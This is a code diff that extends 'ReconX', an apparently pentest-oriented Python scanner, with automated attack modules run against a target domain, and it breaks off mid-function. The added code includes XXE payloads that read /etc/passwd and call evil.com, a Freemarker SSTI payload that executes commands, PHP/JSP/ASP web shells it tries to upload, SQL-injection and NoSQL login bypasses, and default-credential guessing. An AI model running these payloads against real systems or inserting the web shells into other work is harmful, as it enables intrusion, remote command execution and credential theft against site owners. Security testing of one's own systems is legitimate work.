@@ -1410,7 +1410,24 @@ class ReconX:
 {Colors.GREEN}15.{Colors.END} CMS Enumeration
 {Colors.GREEN}16.{Colors.END} WAF Detection
 {Colors.GREEN}17.{Colors.END} Information Disclosure
-{Colors.GREEN}18.{Colors.END} Full Scan (All tests)
+{Colors.GREEN}18.{Colors.END} CSRF Testing
+{Colors.GREEN}19.{Colors.END} JWT Token Testing
+{Colors.GREEN}20.{Colors.END} Subdomain Takeover
+{Colors.GREEN}21.{Colors.END} GitHub Dorking
+{Colors.GREEN}22.{Colors.END} SSL/TLS Analysis
+{Colors.GREEN}23.{Colors.END} CORS Misconfiguration
+{Colors.GREEN}24.{Colors.END} XXE Testing
+{Colors.GREEN}25.{Colors.END} SSTI Testing
+{Colors.GREEN}26.{Colors.END} NoSQL Injection
+{Colors.GREEN}27.{Colors.END} File Upload Vulnerabilities
+{Colors.GREEN}28.{Colors.END} Authentication Bypass
+{Colors.GREEN}29.{Colors.END} Cloud Storage Enumeration
+{Colors.GREEN}30.{Colors.END} WebSocket Testing
+{Colors.GREEN}31.{Colors.END} Deserialization Testing
+{Colors.GREEN}32.{Colors.END} Race Condition Testing
+{Colors.GREEN}33.{Colors.END} Business Logic Testing
+{Colors.GREEN}34.{Colors.END} Nuclei Template Execution
+{Colors.GREEN}35.{Colors.END} Full Scan (All tests)
 {Colors.GREEN}0.{Colors.END}  Exit
 
 {Colors.YELLOW}Enter your choices (comma-separated, e.g., 1,2,3): {Colors.END}"""
@@ -1438,11 +1455,28 @@ class ReconX:
             15: self.cms_enumeration,
             16: self.waf_detection,
             17: self.information_disclosure,
-            18: self.full_scan
+            18: self.csrf_testing,
+            19: self.jwt_token_testing,
+            20: self.subdomain_takeover,
+            21: self.github_dorking,
+            22: self.ssl_tls_analysis,
+            23: self.cors_misconfiguration,
+            24: self.xxe_testing,
+            25: self.ssti_testing,
+            26: self.nosql_injection_testing,
+            27: self.file_upload_vulnerabilities,
+            28: self.authentication_bypass,
+            29: self.cloud_storage_enumeration,
+            30: self.websocket_testing,
+            31: self.deserialization_testing,
+            32: self.race_condition_testing,
+            33: self.business_logic_testing,
+            34: self.nuclei_template_execution,
+            35: self.full_scan
         }
         
         try:
-            if '18' in choices:
+            if '35' in choices:
                 self.full_scan()
             else:
                 selected = [int(x.strip()) for x in choices.split(',') if x.strip().isdigit()]
@@ -1458,7 +1492,7 @@ class ReconX:
     
     def full_scan(self):
         """Run full reconnaissance scan"""
-        self.print_info("Starting full reconnaissance scan...")
+        self.print_info("Starting comprehensive reconnaissance scan...")
         
         # Run all scans in order
         scans = [
@@ -1468,21 +1502,1057 @@ class ReconX:
             ("Directory Bruteforce", self.directory_bruteforce),
             ("JavaScript Analysis", self.javascript_analysis),
             ("Parameter Discovery", self.parameter_discovery),
+            ("XSS Testing", self.xss_testing),
+            ("SQL Injection Testing", self.sql_injection_testing),
+            ("SSRF/RCE Testing", self.ssrf_rce_testing),
+            ("LFI/RFI Testing", self.lfi_rfi_testing),
+            ("Open Redirect Testing", self.open_redirect_testing),
             ("Security Headers Check", self.security_headers_check),
             ("API Reconnaissance", self.api_reconnaissance),
             ("S3 Bucket Enumeration", self.s3_bucket_enumeration),
             ("CMS Enumeration", self.cms_enumeration),
             ("WAF Detection", self.waf_detection),
-            ("Information Disclosure", self.information_disclosure)
+            ("Information Disclosure", self.information_disclosure),
+            ("CSRF Testing", self.csrf_testing),
+            ("JWT Token Testing", self.jwt_token_testing),
+            ("Subdomain Takeover", self.subdomain_takeover),
+            ("GitHub Dorking", self.github_dorking),
+            ("SSL/TLS Analysis", self.ssl_tls_analysis),
+            ("CORS Misconfiguration", self.cors_misconfiguration),
+            ("XXE Testing", self.xxe_testing),
+            ("SSTI Testing", self.ssti_testing),
+            ("NoSQL Injection", self.nosql_injection_testing),
+            ("File Upload Vulnerabilities", self.file_upload_vulnerabilities),
+            ("Authentication Bypass", self.authentication_bypass),
+            ("Cloud Storage Enumeration", self.cloud_storage_enumeration),
+            ("WebSocket Testing", self.websocket_testing),
+            ("Deserialization Testing", self.deserialization_testing),
+            ("Race Condition Testing", self.race_condition_testing),
+            ("Business Logic Testing", self.business_logic_testing),
+            ("Nuclei Template Execution", self.nuclei_template_execution)
         ]
         
         for scan_name, scan_func in scans:
             self.print_info(f"Running {scan_name}...")
-            scan_func()
-            time.sleep(2)  # Brief pause between scans
+            try:
+                scan_func()
+            except Exception as e:
+                self.print_error(f"Error in {scan_name}: {e}")
+            time.sleep(1)  # Brief pause between scans
         
-        self.print_success("Full reconnaissance scan completed!")
+        self.print_success("Comprehensive reconnaissance scan completed!")
         self.print_info(f"Results saved in: {self.scan_dir}")
+
+    # ============================================================================
+    # NEW ADVANCED ATTACK METHODS 
+    # ============================================================================
+
+    def csrf_testing(self):
+        """Test for CSRF vulnerabilities"""
+        self.print_info("Starting CSRF vulnerability testing...")
+        
+        csrf_output = f"{self.scan_dir}/vulnerabilities/csrf_{self.domain}.txt"
+        
+        # Basic CSRF token analysis
+        try:
+            import requests
+            response = requests.get(f"https://{self.domain}", verify=False, timeout=10)
+            
+            csrf_indicators = ['csrf', 'token', '_token', 'authenticity_token']
+            csrf_found = []
+            
+            for indicator in csrf_indicators:
+                if indicator in response.text.lower():
+                    csrf_found.append(indicator)
+            
+            with open(csrf_output, 'w') as f:
+                if csrf_found:
+                    f.write(f"CSRF tokens found: {', '.join(csrf_found)}\n")
+                    f.write("Manual testing recommended for CSRF bypass\n")
+                else:
+                    f.write("No obvious CSRF protection found - potential vulnerability\n")
+                    
+        except Exception as e:
+            self.print_error(f"CSRF testing failed: {e}")
+        
+        self.print_success("CSRF testing completed")
+
+    def jwt_token_testing(self):
+        """Analyze JWT tokens for vulnerabilities"""
+        self.print_info("Starting JWT token analysis...")
+        
+        jwt_output = f"{self.scan_dir}/vulnerabilities/jwt_{self.domain}.txt"
+        
+        try:
+            import requests
+            import json
+            import base64
+            
+            response = requests.get(f"https://{self.domain}", verify=False, timeout=10)
+            
+            # Look for JWT patterns
+            jwt_patterns = ['eyJ', 'Bearer ', 'Authorization:']
+            potential_jwts = []
+            
+            for pattern in jwt_patterns:
+                if pattern in response.text:
+                    potential_jwts.append(pattern)
+            
+            with open(jwt_output, 'w') as f:
+                if potential_jwts:
+                    f.write(f"Potential JWT indicators found: {', '.join(potential_jwts)}\n")
+                    f.write("Recommendations:\n")
+                    f.write("- Test for algorithm confusion (HS256 vs RS256)\n")
+                    f.write("- Check for weak signing keys\n")
+                    f.write("- Verify token expiration\n")
+                else:
+                    f.write("No JWT indicators found\n")
+                    
+        except Exception as e:
+            self.print_error(f"JWT analysis failed: {e}")
+        
+        self.print_success("JWT token analysis completed")
+
+    def subdomain_takeover(self):
+        """Check for subdomain takeover vulnerabilities"""
+        self.print_info("Starting subdomain takeover detection...")
+        
+        takeover_output = f"{self.scan_dir}/vulnerabilities/subdomain_takeover_{self.domain}.txt"
+        
+        # First ensure we have subdomains
+        subdomains_file = f"{self.scan_dir}/subdomains/subdomains.txt"
+        if not os.path.exists(subdomains_file):
+            self.subdomain_enumeration()
+        
+        if self.check_tool_installed('subjack'):
+            self.run_command(f"subjack -w {subdomains_file} -o {takeover_output}")
+        else:
+            # Manual subdomain takeover detection
+            try:
+                import requests
+                import dns.resolver
+                
+                takeover_indicators = {
+                    'github.io': 'There isn\'t a GitHub Pages site here',
+                    'herokuapp.com': 'No such app',
+                    'amazonaws.com': 'NoSuchBucket',
+                    'azurewebsites.net': 'Error 404',
+                    'cloudfront.net': 'Bad Request'
+                }
+                
+                with open(takeover_output, 'w') as f:
+                    f.write("Subdomain Takeover Analysis\n")
+                    f.write("=" * 40 + "\n\n")
+                    
+                    if os.path.exists(subdomains_file):
+                        with open(subdomains_file, 'r') as sub_file:
+                            for subdomain in sub_file:
+                                subdomain = subdomain.strip()
+                                if subdomain:
+                                    try:
+                                        response = requests.get(f"https://{subdomain}", timeout=5, verify=False)
+                                        for service, indicator in takeover_indicators.items():
+                                            if service in subdomain and indicator in response.text:
+                                                f.write(f"POTENTIAL TAKEOVER: {subdomain} -> {service}\n")
+                                    except:
+                                        pass
+                    else:
+                        f.write("No subdomains file found\n")
+                        
+            except Exception as e:
+                self.print_error(f"Subdomain takeover detection failed: {e}")
+        
+        self.print_success("Subdomain takeover detection completed")
+
+    def github_dorking(self):
+        """Perform GitHub dorking for sensitive information"""
+        self.print_info("Starting GitHub reconnaissance...")
+        
+        github_output = f"{self.scan_dir}/osint/github_{self.domain}.txt"
+        
+        try:
+            # GitHub search queries
+            search_queries = [
+                f'"{self.domain}" password',
+                f'"{self.domain}" api_key',
+                f'"{self.domain}" secret',
+                f'"{self.domain}" config',
+                f'"{self.domain}" database',
+                f'"{self.domain}" credentials',
+                f'"{self.domain}" token',
+                f'site:{self.domain} filename:config'
+            ]
+            
+            with open(github_output, 'w') as f:
+                f.write("GitHub Dorking Queries\n")
+                f.write("=" * 40 + "\n\n")
+                
+                for query in search_queries:
+                    f.write(f"Search: {query}\n")
+                    f.write(f"URL: https://github.com/search?q={query.replace(' ', '%20')}\n\n")
+                
+                f.write("Manual Review Required:\n")
+                f.write("- Check repositories for leaked credentials\n")
+                f.write("- Review configuration files\n")
+                f.write("- Look for hardcoded secrets\n")
+                
+        except Exception as e:
+            self.print_error(f"GitHub dorking failed: {e}")
+        
+        self.print_success("GitHub reconnaissance completed")
+
+    def ssl_tls_analysis(self):
+        """Enhanced SSL/TLS security analysis"""
+        self.print_info("Starting enhanced SSL/TLS analysis...")
+        
+        ssl_output = f"{self.scan_dir}/ssl/ssl_analysis_{self.domain}.txt"
+        Path(f"{self.scan_dir}/ssl").mkdir(parents=True, exist_ok=True)
+        
+        # SSLyze analysis
+        if self.check_tool_installed('sslyze'):
+            self.run_command(f"sslyze --regular {self.domain} > {ssl_output}")
+        
+        # testssl.sh analysis
+        if os.path.exists("/opt/testssl.sh/testssl.sh"):
+            testssl_output = f"{self.scan_dir}/ssl/testssl_{self.domain}.txt"
+            self.run_command(f"/opt/testssl.sh/testssl.sh --fast {self.domain} > {testssl_output}")
+        
+        # Manual SSL analysis
+        try:
+            import ssl
+            import socket
+            
+            manual_output = f"{self.scan_dir}/ssl/manual_ssl_{self.domain}.txt"
+            
+            context = ssl.create_default_context()
+            with socket.create_connection((self.domain, 443), timeout=10) as sock:
+                with context.wrap_socket(sock, server_hostname=self.domain) as ssock:
+                    cert = ssock.getpeercert()
+                    
+                    with open(manual_output, 'w') as f:
+                        f.write("SSL Certificate Analysis\n")
+                        f.write("=" * 40 + "\n\n")
+                        f.write(f"Subject: {dict(x[0] for x in cert['subject'])}\n")
+                        f.write(f"Issuer: {dict(x[0] for x in cert['issuer'])}\n")
+                        f.write(f"Version: {cert['version']}\n")
+                        f.write(f"Serial Number: {cert['serialNumber']}\n")
+                        f.write(f"Not Before: {cert['notBefore']}\n")
+                        f.write(f"Not After: {cert['notAfter']}\n")
+                        
+                        if 'subjectAltName' in cert:
+                            f.write(f"Subject Alt Names: {cert['subjectAltName']}\n")
+                            
+        except Exception as e:
+            self.print_error(f"Manual SSL analysis failed: {e}")
+        
+        self.print_success("SSL/TLS analysis completed")
+
+    def cors_misconfiguration(self):
+        """Test for CORS misconfigurations"""
+        self.print_info("Starting CORS misconfiguration testing...")
+        
+        cors_output = f"{self.scan_dir}/vulnerabilities/cors_{self.domain}.txt"
+        
+        try:
+            import requests
+            
+            test_origins = [
+                'https://evil.com',
+                'http://evil.com',
+                f'https://evil.{self.domain}',
+                'null',
+                'https://localhost',
+                '*'
+            ]
+            
+            with open(cors_output, 'w') as f:
+                f.write("CORS Misconfiguration Analysis\n")
+                f.write("=" * 40 + "\n\n")
+                
+                for origin in test_origins:
+                    try:
+                        headers = {'Origin': origin}
+                        response = requests.get(f"https://{self.domain}", headers=headers, timeout=10, verify=False)
+                        
+                        if 'Access-Control-Allow-Origin' in response.headers:
+                            allowed_origin = response.headers['Access-Control-Allow-Origin']
+                            if allowed_origin == origin or allowed_origin == '*':
+                                f.write(f"POTENTIAL VULNERABILITY: Origin {origin} allowed\n")
+                                f.write(f"Response: {allowed_origin}\n\n")
+                        
+                    except Exception as e:
+                        f.write(f"Error testing origin {origin}: {e}\n")
+                
+                f.write("Recommendations:\n")
+                f.write("- Implement strict origin validation\n")
+                f.write("- Avoid using wildcard (*) for credentials\n")
+                f.write("- Use whitelist of trusted domains\n")
+                
+        except Exception as e:
+            self.print_error(f"CORS testing failed: {e}")
+        
+        self.print_success("CORS misconfiguration testing completed")
+
+    def xxe_testing(self):
+        """Test for XXE (XML External Entity) vulnerabilities"""
+        self.print_info("Starting XXE vulnerability testing...")
+        
+        xxe_output = f"{self.scan_dir}/vulnerabilities/xxe_{self.domain}.txt"
+        
+        # XXE payloads
+        xxe_payloads = [
+            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
+            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://evil.com/">]><test>&xxe;</test>',
+            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>'
+        ]
+        
+        try:
+            import requests
+            
+            with open(xxe_output, 'w') as f:
+                f.write("XXE Vulnerability Testing\n")
+                f.write("=" * 40 + "\n\n")
+                
+                # Test common XML endpoints
+                endpoints = ['/', '/api', '/xml', '/soap']
+                
+                for endpoint in endpoints:
+                    f.write(f"Testing endpoint: {endpoint}\n")
+                    
+                    for i, payload in enumerate(xxe_payloads):
+                        try:
+                            headers = {'Content-Type': 'application/xml'}
+                            response = requests.post(f"https://{self.domain}{endpoint}", 
+                                                   data=payload, headers=headers, timeout=10, verify=False)
+                            
+                            if 'root:' in response.text or 'passwd' in response.text:
+                                f.write(f"POTENTIAL XXE VULNERABILITY with payload {i+1}\n")
+                                f.write(f"Response length: {len(response.text)}\n\n")
+                        except Exception as e:
+                            f.write(f"Payload {i+1} error: {e}\n")
+                    
+                    f.write("\n")
+                
+                f.write("Manual testing recommendations:\n")
+                f.write("- Test file upload endpoints with XML files\n")
+                f.write("- Check SOAP/XML-RPC services\n")
+                f.write("- Test API endpoints accepting XML\n")
+                
+        except Exception as e:
+            self.print_error(f"XXE testing failed: {e}")
+        
+        self.print_success("XXE testing completed")
+
+    def ssti_testing(self):
+        """Test for Server-Side Template Injection"""
+        self.print_info("Starting SSTI vulnerability testing...")
+        
+        ssti_output = f"{self.scan_dir}/vulnerabilities/ssti_{self.domain}.txt"
+        
+        # SSTI payloads for different template engines
+        ssti_payloads = {
+            'Jinja2': ['{{7*7}}', '{{config}}', '{{request}}'],
+            'Twig': ['{{7*7}}', '{{_self}}', '{{dump(app)}}'],
+            'Smarty': ['{7*7}', '{$smarty.version}', '{php}echo 7*7{/php}'],
+            'Freemarker': ['${7*7}', '${product.getClass()}', '<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}'],
+            'Velocity': ['${"7"*7}', '#set($x=7*7)$x', '$class.inspect("java.lang.Runtime")']
+        }
+        
+        try:
+            import requests
+            from urllib.parse import quote
+            
+            with open(ssti_output, 'w') as f:
+                f.write("SSTI Vulnerability Testing\n")
+                f.write("=" * 40 + "\n\n")
+                
+                # Test common parameters
+                test_params = ['q', 'search', 'name', 'template', 'page', 'view']
+                
+                for param in test_params:
+                    f.write(f"Testing parameter: {param}\n")
+                    
+                    for engine, payloads in ssti_payloads.items():
+                        f.write(f"\nTesting {engine} payloads:\n")
+                        
+                        for payload in payloads:
+                            try:
+                                encoded_payload = quote(payload)
+                                url = f"https://{self.domain}/?{param}={encoded_payload}"
+                                
+                                response = requests.get(url, timeout=10, verify=False)
+                                
+                                # Check for template execution
+                                if payload == '{{7*7}}' and '49' in response.text:
+                                    f.write(f"POTENTIAL SSTI ({engine}): {payload} -> 49 found in response\n")
+                                elif payload == '{7*7}' and '49' in response.text:
+                                    f.write(f"POTENTIAL SSTI ({engine}): {payload} -> 49 found in response\n")
+                                elif payload == '${7*7}' and '49' in response.text:
+                                    f.write(f"POTENTIAL SSTI ({engine}): {payload} -> 49 found in response\n")
+                                elif 'config' in payload and 'SECRET_KEY' in response.text:
+                                    f.write(f"POTENTIAL SSTI ({engine}): Config exposure detected\n")
+                                
+                            except Exception as e:
+                                f.write(f"Error with payload {payload}: {e}\n")
+                    
+                    f.write("\n" + "-"*50 + "\n")
+                
+                f.write("\nManual testing recommendations:\n")
+                f.write("- Test POST parameters and form fields\n")
+                f.write("- Check file upload functionality\n")
+                f.write("- Test contact forms and email templates\n")
+                
+        except Exception as e:
+            self.print_error(f"SSTI testing failed: {e}")
+        
+        self.print_success("SSTI testing completed")
+
+    def nosql_injection_testing(self):
+        """Test for NoSQL injection vulnerabilities"""
+        self.print_info("Starting NoSQL injection testing...")
+        
+        nosql_output = f"{self.scan_dir}/vulnerabilities/nosql_{self.domain}.txt"
+        
+        # NoSQL injection payloads
+        nosql_payloads = {
+            'MongoDB': [
+                '{"$ne": null}',
+                '{"$gt": ""}',
+                '{"$regex": ".*"}',
+                '{"$where": "this.password.match(/.*/)"}',
+                '{"username": {"$ne": null}, "password": {"$ne": null}}'
+            ],
+            'CouchDB': [
+                '{"selector": {"_id": {"$gt": null}}}',
+                '{"selector": {"password": {"$ne": "invalid"}}}',
+                '{"selector": {"$and": [{"username": {"$ne": null}}]}}'
+            ]
+        }
+        
+        try:
+            import requests
+            import json
+            
+            with open(nosql_output, 'w') as f:
+                f.write("NoSQL Injection Testing\n")
+                f.write("=" * 40 + "\n\n")
+                
+                # Test common API endpoints
+                endpoints = ['/api/users', '/api/login', '/api/search', '/login', '/search']
+                
+                for endpoint in endpoints:
+                    f.write(f"Testing endpoint: {endpoint}\n")
+                    
+                    for db_type, payloads in nosql_payloads.items():
+                        f.write(f"\nTesting {db_type} payloads:\n")
+                        
+                        for payload in payloads:
+                            try:
+                                headers = {'Content-Type': 'application/json'}
+                                response = requests.post(f"https://{self.domain}{endpoint}", 
+                                                       data=payload, headers=headers, timeout=10, verify=False)
+                                
+                                # Check for potential injection
+                                if response.status_code == 200 and len(response.text) > 100:
+                                    f.write(f"Interesting response for payload: {payload}\n")
+                                    f.write(f"Status: {response.status_code}, Length: {len(response.text)}\n")
+                                
+                                # Also test as URL parameter
+                                param_response = requests.get(f"https://{self.domain}{endpoint}?q={payload}", 
+                                                            timeout=10, verify=False)
+                                if param_response.status_code == 200:
+                                    f.write(f"URL param test response: {param_response.status_code}\n")
+                                
+                            except Exception as e:
+                                f.write(f"Error with payload {payload}: {e}\n")
+                    
+                    f.write("\n" + "-"*50 + "\n")
+                
+                f.write("\nManual testing recommendations:\n")
+                f.write("- Test authentication bypass with NoSQL operators\n")
+                f.write("- Check for data extraction via blind NoSQL injection\n")
+                f.write("- Test aggregation pipeline injections\n")
+                
+        except Exception as e:
+            self.print_error(f"NoSQL injection testing failed: {e}")
+        
+        self.print_success("NoSQL injection testing completed")
+
+    def file_upload_vulnerabilities(self):
+        """Test for file upload vulnerabilities"""
+        self.print_info("Starting file upload vulnerability testing...")
+        
+        upload_output = f"{self.scan_dir}/vulnerabilities/file_upload_{self.domain}.txt"
+        
+        try:
+            import requests
+            import tempfile
+            import os
+            
+            # Create test files
+            test_files = {
+                'php_shell.php': '<?php system($_GET["cmd"]); ?>',
+                'jsp_shell.jsp': '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
+                'asp_shell.asp': '<%eval request("cmd")%>',
+                'test.txt': 'test file content',
+                'test.jpg': b'\xff\xd8\xff\xe0JFIF',  # JPEG header
+                'malicious.php.jpg': '<?php system($_GET["cmd"]); ?>',
+                '.htaccess': 'AddType application/x-httpd-php .jpg'
+            }
+            
+            with open(upload_output, 'w') as f:
+                f.write("File Upload Vulnerability Testing\n")
+                f.write("=" * 40 + "\n\n")
+                
+                # Common upload endpoints
+                upload_endpoints = ['/upload', '/api/upload', '/files/upload', '/admin/upload']
+                
+                for endpoint in upload_endpoints:
+                    f.write(f"Testing endpoint: {endpoint}\n")
+                    
+                    for filename, content in test_files.items():
+                        try:
+                            # Create temporary file
+                            with tempfile.NamedTemporaryFile(mode='wb', delete=False) as tmp_file:
+                                if isinstance(content, str):
+                                    tmp_file.write(content.encode())
+                                else:
+                                    tmp_file.write(content)
+                                tmp_path = tmp_file.name
+                            
+                            # Test upload
+                            with open(tmp_path, 'rb') as test_file:
+                                files = {'file': (filename, test_file)}
+                                response = requests.post(f"https://{self.domain}{endpoint}", 
+                                                       files=files, timeout=10, verify=False)
+                                
+                                f.write(f"File: {filename} -> Status: {response.status_code}\n")
+                                
+                                if response.status_code in [200, 201, 302]:
+                                    f.write(f"POTENTIAL UPLOAD SUCCESS: {filename}\n")
+                                    if 'upload' in response.text.lower():
+                                        f.write("Upload confirmation found in response\n")
+                            
+                            # Cleanup
+                            os.unlink(tmp_path)
+                            
+                        except Exception as e:
+                            f.write(f"Error testing {filename}: {e}\n")
+                    
+                    f.write("\n" + "-"*50 + "\n")
+                
+                f.write("\nManual testing recommendations:\n")
+                f.write("- Test double extensions (file.php.jpg)\n")
+                f.write("- Try null byte injections (file.php%00.jpg)\n")
+                f.write("- Check for path traversal in filename\n")
+                f.write("- Test MIME type validation bypass\n")
+                f.write("- Verify uploaded file execution\n")
+                
+        except Exception as e:
+            self.print_error(f"File upload testing failed: {e}")
+        
+        self.print_success("File upload vulnerability testing completed")
+
+    def authentication_bypass(self):
+        """Test for authentication bypass vulnerabilities"""
+        self.print_info("Starting authentication bypass testing...")
+        
+        auth_output = f"{self.scan_dir}/vulnerabilities/auth_bypass_{self.domain}.txt"
+        
+        # Authentication bypass payloads
+        bypass_payloads = {
+            'SQL_Injection': ["' OR '1'='1", "admin'--", "' OR 1=1#"],
+            'NoSQL_Injection': ['{"$ne": null}', '{"$gt": ""}'],
+            'Default_Creds': [('admin', 'admin'), ('admin', 'password'), ('root', 'root')],
+            'Parameter_Pollution': ['username=admin&username=guest', 'user[]=admin&user[]=guest'],
+            'HTTP_Verb_Tampering': ['PUT', 'PATCH', 'DELETE', 'HEAD']
+        }
+        
+        try:
+            import requests
+            
+            with open(auth_output, 'w') as f:
+                f.write("Authentication Bypass Testing\n")
+                f.write("=" * 40 + "\n\n")
+                
+                # Common login endpoints
+                login_endpoints = ['/login', '/admin', '/api/login', '/auth', '/signin']
+                
+                for endpoint in login_endpoints:
+                    f.write(f"Testing endpoint: {endpoint}\n")
+                    
+                    # Test SQL injection bypasses
+                    for payload in bypass_payloads['SQL_Injection']:
+                        try:
+                            data = {'username': payload, 'password': 'test'}
+                            response = requests.post(f"https://{self.domain}{endpoint}", 
+                                                   data=data, timeout=10, verify=False, allow_redirects=False)
+                            
+                            if response.status_code in [302, 200] and ('dashboard' in response.text.lower() or 
+                                                                      'welcome' in response.text.lower() or
+                                                                      'redirect' in response.headers.get('location', '').lower()):
+                                f.write(f"POTENTIAL SQL INJECTION BYPASS: {payload}\n")
+                                
+                        except Exception as e:
+                            f.write(f"Error with SQL payload {payload}: {e}\n")
+                    
+                    # Test default credentials
+                    for username, password in bypass_payloads['Default_Creds']:
+                        try:
+                            data = {'username': username, 'password': password}
+                            response = requests.post(f"https://{self.domain}{endpoint}", 
+                                                   data=data, timeout=10, verify=False, allow_redirects=False)
+                            
+                            if response.status_code in [302, 200] and 'invalid' not in response.text.lower():
+                                f.write(f"POTENTIAL DEFAULT CREDS: {username}:{password}\n")
+                                
+                        except Exception as e:
+                            f.write(f"Error with creds {username}:{password}: {e}\n")
+                    
+                    f.write("\n" + "-"*50 + "\n")
+                
+                f.write("\nManual testing recommendations:\n")
+                f.write("- Test session fixation attacks\n")
+                f.write("- Check for JWT algorithm confusion\n")
+                f.write("- Test OAuth implementation flaws\n")
+                f.write("- Verify password reset functionality\n")
+                
+        except Exception as e:
+            self.print_error(f"Authentication bypass testing failed: {e}")
+        
+        self.print_success("Authentication bypass testing completed")
+
+    def cloud_storage_enumeration(self):
+        """Enumerate cloud storage buckets (AWS S3, GCS, Azure)"""
+        self.print_info("Starting cloud storage enumeration...")
+        
+        cloud_output = f"{self.scan_dir}/cloud/storage_{self.domain}.txt"
+        Path(f"{self.scan_dir}/cloud").mkdir(parents=True, exist_ok=True)
+        
+        # Cloud storage patterns
+        storage_patterns = {
+            'AWS_S3': [
+                f'{self.domain}.s3.amazonaws.com',
+                f'{self.domain.replace(".", "-")}.s3.amazonaws.com',
+                f'{self.domain.replace(".", "")}.s3.amazonaws.com',
+                f'{self.domain}-backup.s3.amazonaws.com',
+                f'{self.domain}-data.s3.amazonaws.com'
+            ],
+            'Google_Cloud': [
+                f'storage.googleapis.com/{self.domain}',
+                f'storage.googleapis.com/{self.domain.replace(".", "-")}',
+                f'{self.domain}.storage.googleapis.com'
+            ],
+            'Azure_Blob': [
+                f'{self.domain}.blob.core.windows.net',
+                f'{self.domain.replace(".", "")}.blob.core.windows.net',
+                f'{self.domain.replace(".", "-")}.blob.core.windows.net'
+            ]
+        }
+        
+        try:
+            import requests
+            
+            with open(cloud_output, 'w') as f:
+                f.write("Cloud Storage Enumeration\n")
+                f.write("=" * 40 + "\n\n")
+                
+                for platform, urls in storage_patterns.items():
+                    f.write(f"{platform} Testing:\n")
+                    
+                    for url in urls:
+                        try:
+                            response = requests.get(f"https://{url}", timeout=10, verify=False)
+                            
+                            f.write(f"URL: {url} -> Status: {response.status_code}\n")
+                            
+                            if response.status_code == 200:
+                                f.write(f"ACCESSIBLE BUCKET FOUND: {url}\n")
+                                if 'xml' in response.headers.get('content-type', '').lower():
+                                    f.write("XML content detected - likely S3 bucket listing\n")
+                            elif response.status_code == 403:
+                                f.write(f"BUCKET EXISTS (Access Denied): {url}\n")
+                                
+                        except Exception as e:
+                            f.write(f"Error checking {url}: {e}\n")
+                    
+                    f.write("\n")
+                
+                f.write("Manual verification recommendations:\n")
+                f.write("- Use aws s3 ls for S3 bucket enumeration\n")
+                f.write("- Check for misconfigured bucket policies\n")
+                f.write("- Test file upload to accessible buckets\n")
+                
+        except Exception as e:
+            self.print_error(f"Cloud storage enumeration failed: {e}")
+        
+        self.print_success("Cloud storage enumeration completed")
+
+    def websocket_testing(self):
+        """Test WebSocket security"""
+        self.print_info("Starting WebSocket security testing...")
+        
+        ws_output = f"{self.scan_dir}/vulnerabilities/websocket_{self.domain}.txt"
+        
+        try:
+            import requests
+            
+            with open(ws_output, 'w') as f:
+                f.write("WebSocket Security Testing\n")
+                f.write("=" * 40 + "\n\n")
+                
+                # Check for WebSocket endpoints
+                common_ws_endpoints = ['/ws', '/websocket', '/socket.io', '/api/ws', '/chat']
+                
+                for endpoint in common_ws_endpoints:
+                    try:
+                        # Test WebSocket upgrade
+                        headers = {
+                            'Connection': 'Upgrade',
+                            'Upgrade': 'websocket',
+                            'Sec-WebSocket-Version': '13',
+                            'Sec-WebSocket-Key': 'x3JJHMbDL1EzLkh9GBhXDw=='
+                        }
+                        
+                        response = requests.get(f"https://{self.domain}{endpoint}", 
+                                              headers=headers, timeout=10, verify=False)
+                        
+                        f.write(f"Endpoint: {endpoint} -> Status: {response.status_code}\n")
+                        
+                        if response.status_code == 101:
+                            f.write(f"WEBSOCKET ENDPOINT FOUND: {endpoint}\n")
+                            f.write("Manual testing required:\n")
+                            f.write("- Test authentication bypass\n")
+                            f.write("- Check for XSS in WebSocket messages\n")
+                            f.write("- Test rate limiting\n\n")
+                        elif 'websocket' in response.text.lower():
+                            f.write(f"WebSocket references found in {endpoint}\n")
+                            
+                    except Exception as e:
+                        f.write(f"Error testing {endpoint}: {e}\n")
+                
+                f.write("\nWebSocket security recommendations:\n")
+                f.write("- Implement proper authentication\n")
+                f.write("- Validate and sanitize all messages\n")
+                f.write("- Use rate limiting and connection limits\n")
+                f.write("- Check origin headers properly\n")
+                
+        except Exception as e:
+            self.print_error(f"WebSocket testing failed: {e}")
+        
+        self.print_success("WebSocket security testing completed")
+
+    def deserialization_testing(self):
+        """Test for deserialization vulnerabilities"""
+        self.print_info("Starting deserialization vulnerability testing...")
+        
+        deser_output = f"{self.scan_dir}/vulnerabilities/deserialization_{self.domain}.txt"
+        
+        # Common deserialization patterns and payloads
+        deser_patterns = {
+            'Java': [
+                'rO0AB',  # Java serialized object header (base64)
+                'aced00',  # Java serialized object header (hex)
+                'serialver'
+            ],
+            'Python': [
+                'pickle',
+                'cPickle',
+                '__reduce__'
+            ],
+            'PHP': [
+                'O:',  # PHP object serialization
+                'a:',  # PHP array serialization
+                'serialize'
+            ],
+            '.NET': [
+                'AAEAAAD',  # .NET BinaryFormatter header
+                'System.Runtime.Serialization'
+            ]
+        }
+        
+        try:
+            import requests
+            import base64
+            
+            with open(deser_output, 'w') as f:
+                f.write("Deserialization Vulnerability Testing\n")
+                f.write("=" * 40 + "\n\n")
+                
+                # Test common endpoints that might handle serialized data
+                endpoints = ['/api', '/upload', '/import', '/data']
+                
+                for endpoint in endpoints:
+                    f.write(f"Testing endpoint: {endpoint}\n")
+                    
+                    # Check for deserialization indicators in responses
+                    try:
+                        response = requests.get(f"https://{self.domain}{endpoint}", timeout=10, verify=False)
+                        
+                        for lang, patterns in deser_patterns.items():
+                            for pattern in patterns:
+                                if pattern in response.text:
+                                    f.write(f"POTENTIAL {lang} DESERIALIZATION: Found '{pattern}'\n")
+                    
+                        # Test with common serialized payloads
+                        test_payloads = [
+                            'rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAA',  # Java empty ArrayList
+                            'O:8:"stdClass":0:{}',  # PHP empty object
+                            'ctest\nTest\nq\x01.'  # Python pickle
+                        ]
+                        
+                        for payload in test_payloads:
+                            try:
